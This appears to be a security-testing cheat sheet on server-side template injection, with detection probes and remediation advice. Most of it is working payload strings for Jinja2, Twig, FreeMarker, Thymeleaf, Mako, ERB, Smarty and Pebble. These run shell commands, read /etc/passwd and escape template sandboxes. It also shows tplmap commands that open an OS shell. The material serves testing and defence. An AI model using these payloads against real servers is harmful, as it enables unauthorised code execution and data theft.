# Server-Side Template Injection (SSTI) Testing

## Overview
Server-Side Template Injection occurs when user input is embedded into server-side templates unsafely. Attackers can inject template directives to read files or gain remote code access on the server.

## Classification
- **CWE:** CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 9.8 (Critical)

## Detection Methodology

### 1. Universal Detection Polyglot
```
${{<%[%'"}}%\
```
If the application errors or behaves differently, template injection may be present.

### 2. Mathematical Expression Testing
```
{{7*7}}          -> 49 (Jinja2, Twig)
${7*7}           -> 49 (FreeMarker, Mako, EL)
#{7*7}           -> 49 (Thymeleaf, Ruby ERB)
<%= 7*7 %>       -> 49 (ERB, EJS)
{7*7}            -> 49 (Smarty)
```

### 3. Template Engine Identification
```
{{7*'7'}}
  49        -> Twig (PHP)
  7777777   -> Jinja2 (Python)
  Error     -> Neither
```

## Engine-Specific Techniques

### Jinja2 (Python - Flask, Django)
```python
# Information disclosure
{{ config.items() }}
{{ request.environ }}

# File read via class traversal
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Code path via globals
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('whoami').read() }}
```

### Twig (PHP - Symfony)
```php
# Twig 3.x
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['id',0]|sort('system')}}
```

### FreeMarker (Java - Spring)
```java
<#assign cmd = "freemarker.template.utility.Execute"?new()>
${cmd("id")}
```

### Thymeleaf (Java - Spring Boot)
```java
# Via Spring Expression Language (SpEL)
${T(java.lang.Runtime).getRuntime().exec('id')}

# URL path based
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### Mako (Python)
```python
${__import__('os').popen('id').read()}
```

### ERB (Ruby)
```ruby
<%= IO.popen("id").read() %>
<%= File.read("/etc/passwd") %>
```

### Smarty (PHP)
```php
{system('id')}
```

### Pebble (Java)
```java
{{ (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id') }}
```

### Handlebars (Node.js)
- Prototype pollution + helpers chain
- Lookup constructor for code path access

## Sandbox Escape Techniques
1. **Python:** Walk the MRO chain to find subprocess classes
2. **Java:** Use reflection and Runtime access
3. **PHP:** Built-in function access via filter/sort
4. **Attribute access bypass:** `|attr('__class__')` instead of `.__class__`
5. **String concatenation:** Build blocked strings from parts
6. **Encoding:** Hex, unicode, base64 encoded payloads

## Tool Usage
```bash
# tplmap - automated SSTI detection and exploitation
tplmap -u "http://target.com/page?name=test"
tplmap -u "http://target.com/page?name=test" --os-shell
tplmap -u "http://target.com/page?name=test" --os-cmd "id"

# SSTImap
sstimap -u "http://target.com/page?name=test"

# Manual with curl
curl "http://target.com/page?name={{7*7}}"
```

## Remediation
1. **Never pass user input into templates** - use template variables instead
2. **Sandbox template engines** with restricted functionality
3. **Use logic-less templates** (Mustache) when possible
4. **Input validation** - reject template syntax characters
5. **Static template analysis** for dangerous constructs
6. **Isolate template rendering** in containers

## Evidence Collection
- Template engine identified and version
- Code access proof (command output)
- Payload used
- Server context (user, OS, environment)
- Application framework details
